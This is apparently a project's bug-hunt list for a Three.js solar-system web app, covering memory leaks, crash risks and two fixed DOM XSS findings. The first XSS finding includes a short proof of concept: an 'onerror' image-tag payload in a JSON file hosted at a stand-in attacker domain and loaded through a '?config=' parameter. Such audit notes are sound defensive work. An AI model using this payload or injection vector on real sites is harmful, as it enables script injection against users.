# 🕸️ The Hunt List

| ID | Status | Severity | Location | Description |
|----|--------|----------|----------|-------------|
| 001| [FIXED] | 🔴 HIGH  | `src/components/CommandPalette.js:223` | DOM XSS via Configuration Injection in Command Palette |
| 002| [FIXED] | 🔴 HIGH  | `src/input.js:354` | DOM XSS via Configuration Injection in Navigation Sidebar |
| 003| [FIXED] | 🟡 MED   | `src/main.js:476` | Unhandled Promise in Initialization |
| 004| [FIXED] | 🟢 LOW   | `src/input.js:19` | Event Listener Memory Leak (Window Resize/Keydown) |
| 005| [FIXED] | 🟢 LOW   | `src/components/CommandPalette.js:160` | Event Listener Memory Leak (Global Keydown) |
| 006| [FIXED] | 🟡 MED   | `src/trails.js:98` | O(N) Array shifting in high-frequency loop |
| 007| [FIXED] | 🟢 LOW   | `src/debris.js:68` | Memory Leak: Undisposed Custom Materials |
| 008| [FIXED] | 🟡 MED   | `download_textures.py:27` | Silent Failure on Asset Download |
| 009| [FIXED] | 🟢 LOW   | `src/instancing.js:33` | Persistent State Pollution in InstanceRegistry |
| 010| [FIXED] | 🟡 MED   | `src/input.js:145` | Logic Flaw: Cross-Object Double Click Detection |
| 011| [FIXED] | 🟡 MED   | `src/managers/ThemeManager.js:20` | Crash Risk: Unsafe LocalStorage Access |
| 012| [FIXED] | 🟢 LOW   | `src/input.js:124` | Memory Leak: Undisposed Event Listeners |
| 013| [OPEN] | 🔴 HIGH  | `src/instancing.js:127` | Crash Risk: `InstancedMesh` has no `dispose()` method |
| 014| [OPEN] | 🔴 HIGH  | `src/input.js:367` | Memory Leak: Orphaned `CommandPalette` with global listener |
| 015| [OPEN] | 🟡 MED   | `src/trails.js:14` | GPU Memory Leak: `TrailManager` lacks `dispose()` |
| 016| [OPEN] | 🟡 MED   | `src/components/CommandPalette.js:172` | Logic Bomb: Crash on missing `name` property |
| 017| [OPEN] | 🟢 LOW   | `src/main.js:492` | Regression: Anonymous Window Resize Listener |

## Details

### 001 - DOM XSS in Command Palette
The `CommandPalette` class renders list items using `innerHTML` with data directly from the `planetData` object. Since `planetData` can be sourced from an external JSON file via the `?config=` URL parameter, an attacker can inject malicious script tags into the `name` or `type` fields of the JSON.

```javascript
// src/components/CommandPalette.js:223
li.innerHTML = `
    <span class="cmd-item-icon">${icon}</span>
    <span class="cmd-item-text">${item.name}</span>
    <span class="cmd-item-meta">${item.type}</span>
`;
```

**Exploit Scenario:**
1. Attacker hosts `evil.json`: `[{"name": "<img src=x onerror=alert(1)>", "type": "Planet"}]`
2. Victim visits `index.html?config=https://attacker.com/evil.json`
3. Victim opens Command Palette (Cmd+K).
4. Malicious script executes.

### 002 - DOM XSS in Navigation Sidebar
Similar to ID 001, the `buildNavTree` function in `src/input.js` uses `innerHTML` to render navigation buttons using `itemData.name` and `itemData.type`.

```javascript
// src/input.js:354
btn.innerHTML = `<span>${icon} ${itemData.name}</span> <span class="nav-type">${itemData.type}</span>`;
```

**Exploit Scenario:**
1. Same setup as above.
2. The XSS triggers immediately upon page load (if `planetData` contains the payload) because the sidebar is built during initialization.

### 003 - Unhandled Promise in Initialization
The `init()` function in `src/main.js` is an `async` function called at the top level without a `.catch()` block. If `init()` fails (e.g., inside `createSystem` or before the internal try/catch), the promise rejection is unhandled. While modern browsers log this to the console, it prevents any global error boundary or fallback UI from handling the crash gracefully.

```javascript
// src/main.js:476
if (!window.__SKIP_INIT__) {
    init(); // Fire and forget
}
```

### 004 & 005 - Event Listener Memory Leaks
Multiple components attach event listeners to the global `window` object but do not provide a mechanism to remove them.
* `src/input.js` adds `keydown` and `resize`.
* `src/components/CommandPalette.js` adds `keydown`.

While this is a Single Page Application (SPA) where the "page" lifespan matches the session, this pattern prevents clean teardown if the application were to be restarted or wrapped in a larger framework (e.g., during tests or if switching scenes).

```javascript
// src/components/CommandPalette.js:160
window.addEventListener('keydown', (e) => { ... });
```

### 006 - Performance: Fake Cyclic Buffer
Replaced the `Array.unshift`/`pop` implementation with a true Ring Buffer using a fixed-size array and a `head` index pointer. This eliminates the O(N) array shifting operation per frame and reduces garbage collection pressure by reusing Vector3 objects.

### 007 - Memory Leak: Undisposed Custom Materials
The `createAsteroidBelt` function now returns a mesh with an attached `dispose()` method. This method correctly disposes of `customDepthMaterial` and `customDistanceMaterial` along with the geometry and main material.

### 008 - Silent Failure: Asset Download
Updated `download_textures.py` to track failed downloads and exit with a non-zero status code (1) if any errors occur. This ensures that CI/CD pipelines or deployment scripts fail fast if assets are missing.

### 009 - State Pollution: Instance Registry
Refactored `InstanceRegistry.addInstance` to use `Object.assign` instead of overwriting `userData` entirely. Added a `dispose()` method to `InstanceRegistry` that cleans up the injected properties (`isInstance`, `instanceId`, `instanceKey`) from the pivot objects and removes the mesh from the scene.

### 010 - Logic Flaw: Cross-Object Double Click Detection
The double-click detection logic in `src/input.js` relies on a global `lastClickTime` variable without verifying if the second click is on the same object as the first.

```javascript
// src/input.js:145
const currentTime = Date.now();
const isDoubleClick = (currentTime - lastClickTime) < doubleClickDelay;
lastClickTime = currentTime;
```

**Scenario:**
1. User clicks "Earth".
2. User quickly moves mouse and clicks "Mars" (within 300ms).
3. Result: The application registers a Double Click on "Mars", triggering the Focus action, even though the user intended two separate selections.

### 011 - Crash Risk: Unsafe LocalStorage Access
In `src/managers/ThemeManager.js`, `localStorage` is accessed directly in the constructor and methods. If the user has disabled cookies/storage (e.g., "Block all cookies" or Incognito mode in some browsers), this throws a `SecurityError` (DOMException), causing the application initialization to crash immediately.

```javascript
// src/managers/ThemeManager.js:20
localStorage.setItem('theme', themeName);
```

### 012 - Memory Leak: Undisposed Event Listeners
Several event listeners are attached to the `window` or DOM elements but are not properly cleaned up in the `dispose` methods or lack a disposal mechanism entirely.

1.  `src/input.js`: The `pointerup` listener on `rendererDomElement` is never removed.
2.  `src/input.js`: Event listeners attached to UI buttons (`btnCamera`, `btnTexture`, etc.) are not tracked or removed.
3.  `src/main.js`: An anonymous `resize` event listener is attached to `window` and cannot be removed.

```javascript
// src/input.js:124
rendererDomElement.addEventListener('pointerup', (event) => { ... });

// src/main.js:464
window.addEventListener('resize', () => { ... });
```

### 013 - Crash Risk: InstancedMesh Disposal
The `InstanceRegistry.dispose` method attempts to call `.dispose()` on `group.mesh`. However, `group.mesh` is an instance of `THREE.InstancedMesh` (inheriting from `THREE.Mesh`), which does **not** have a `dispose()` method. This will throw a `TypeError` when the registry is disposed (e.g., on scene reset).

```javascript
// src/instancing.js:127
group.mesh.dispose(); // TypeError: group.mesh.dispose is not a function
```

### 014 - Memory Leak: Orphaned Command Palette
In `src/input.js`, a new `CommandPalette` instance is created, but the reference is not stored or returned. The `CommandPalette` constructor attaches a global `keydown` listener to `window`. Because the instance is lost, its `destroy()` method is never called by `setupInteraction`'s `dispose` function, causing the event listener to leak permanently.

```javascript
// src/input.js:367
new CommandPalette(context.planetData, paletteCallbacks); // Reference lost
```

### 015 - GPU Memory Leak: TrailManager
The `TrailManager` class allocates `THREE.BufferGeometry` and `THREE.Material` (which consume VRAM), but the class does not provide a `dispose()` method. When the application is reset or re-initialized, the old `TrailManager` is garbage collected by JS, but the WebGL resources remain allocated on the GPU.

### 016 - Logic Bomb: Command Palette Filter
The `filter` method in `CommandPalette` assumes that all items in the `items` array have a `name` property. If `system.json` (or a custom config) contains a malformed entry or an entry without a name, accessing `a.name.toLowerCase()` will throw a runtime error, crashing the UI.

```javascript
// src/components/CommandPalette.js:172
const aName = a.name.toLowerCase(); // Unsafe access
```

### 017 - Regression: Anonymous Resize Listener
Despite Bug 012 being marked as fixed, `src/main.js` still contains an anonymous event listener attached to `window` for handling resize events. Because the function is anonymous, it cannot be removed, leading to a memory leak if `main.js` is ever re-executed.

```javascript
// src/main.js:492
window.addEventListener('resize', () => { ... });
```
